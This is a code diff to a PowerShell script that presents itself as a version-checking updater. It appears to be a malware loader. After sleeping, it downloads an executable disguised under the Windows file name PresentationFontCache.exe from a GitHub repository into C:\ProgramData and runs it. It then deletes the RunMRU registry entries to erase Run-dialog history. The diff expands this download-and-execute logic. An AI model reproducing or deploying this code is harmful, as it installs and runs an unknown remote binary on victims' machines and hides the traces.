@@ -1,16 +1,35 @@
 Start-Sleep -s 10
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/updated.txt'
-# Check if the updated file exists or not
-if ((Invoke-WebRequest $url_text -UseBasicParsing).StatusCode -eq 200) {
-    # if exists, run PresentationFontCache.exe
+$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
+$file_text = "C:\ProgramData\version.txt"
+
+# Download version.txt
+$down = New-Object System.Net.WebClient
+$down.DownloadFile($url_text,$file_text)
+
+# Read the downloaded version.txt
+$version = Get-Content $file_text
+
+# Compare downloaded version.txt with $url_text
+if ($version -eq (Invoke-WebRequest -Uri $url_text -UseBasicParsing).Content) {
+
     $file = "C:\ProgramData\PresentationFontCache.exe"
-    # Run the exe file
-    $exec = New-Object -com shell.application
-    $exec.shellexecute($file)
+
+    # Check if PresentationFontCache.exe exists
+    if (Test-Path $file) {
+        # Run the exe file
+        $exec = New-Object -com shell.application
+        $exec.shellexecute($file)
+    } else {
+        # Download exe file
+        $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
+        $down.DownloadFile($url,$file)
+        # Run the exe file
+        $exec = New-Object -com shell.application
+        $exec.shellexecute($file)
+    }
 } else {
-    # not exists, download the new exe file
-    $down = New-Object System.Net.WebClient
+    # Version change, download the new exe file
     $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
     $file = "C:\ProgramData\PresentationFontCache.exe"
     $down.DownloadFile($url,$file)
@@ -18,7 +37,9 @@ if ((Invoke-WebRequest $url_text -UseBasicParsing).StatusCode -eq 200) {
     $exec = New-Object -com shell.application
     $exec.shellexecute($file)
 }
+
 # Delete registry entry
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
 # Exit the script
 exit
